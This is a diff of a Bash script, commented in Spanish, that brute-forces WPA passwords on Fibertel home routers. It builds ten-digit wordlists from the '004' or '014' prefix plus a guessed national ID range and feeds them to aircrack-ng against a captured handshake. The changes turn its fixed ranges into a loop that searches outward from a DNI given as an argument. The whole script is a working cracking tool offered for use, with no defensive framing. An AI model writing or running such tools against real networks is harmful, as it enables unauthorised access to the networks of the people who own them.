@@ -1,57 +1,56 @@
 #!/bin/bash
 
 echo "Ejecutar este script en screen, fibertel 10 digitos"
-echo -n "ingrese ESSID="
-read ESSID
-echo -n "ingrese archivo .cap ejemplo 0XX-01="
-read capFile
+# $1 ESSID
+# $2 file  ejemplo "0XX-01"
+# $3 DNI start ejemplo "27"
 echo "benchmark......"
 echo "0" > key
 #aircrack-ng -S
 
-#20millones a 30 millones, 10 digitos, 004
-seq -w 0042000000 0043000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
+num=$(($3))
+echo "$num"
+num=$(($num * 100000))
+up=$(($num + 100000))
+dn=$(($num - 100000))
+counter=0
+echo "$num"
+echo "$up"
+echo "$dn"
+echo "$counter"
+
+while [ $(cat key) = "0" ]
+  do
+    #10 digitos, 004, up
+    seq -w 004"$(($num + $counter))" 004"$(($up + $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
+    if [ $(cat key) != "0" ]
+    then
+      rm dic
+      exit 0
+    fi
+    #10 digitos, 014, up
+    seq -w 014"$(($num + $counter))" 014"$(($up + $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
+    if [ $(cat key) != "0" ]
+    then
+      rm dic
+      exit 0
+    fi
+
+  #10 digitos, 004, dn
+  seq -w 004"$(($dn - $counter))" 004"$(($num - $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
+  if [ $(cat key) != "0" ]
   then
+    rm dic
     exit 0
   fi
-#20millones a 30 millones, 10 digitos, 014
-seq -w 0142000000 0143000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
-  then
-    exit 0
-  fi
-#30millones a 44 millones, 10 digitos, 004
-seq -w 0043000000 0044400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
+  #10 digitos, 014, dn
+  seq -w 014"$(($dn - $counter))" 014"$(($num - $counter))" > dic; aircrack-ng -l key -e "$1" -w dic caps/"$2".cap
+  if [ $(cat key) != "0" ]
   then
     rm dic
     exit 0
   fi
-sleep 1
-#30millones a 44 millones, 10 digitos, 014
-seq -w 0143000000 0144400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
-  then
-    rm dic
-    exit 0
-  fi
-sleep 1
-#08millones a 20 millones, 10 digitos, 004
-seq -w 0040800000 0042000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
-  then
-    rm dic
-    exit 0
-  fi
-sleep 1
-#08millones a 20 millones, 10 digitos, 014
-seq -w 0140800000 0142000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
-if [ $(cat key) != "0" ]
-  then
-    rm dic
-    exit 0
-  else
-    rm dic
-    echo "Not Found :/"
-  fi
+
+  counter=$(($counter + 100000))
+
+done
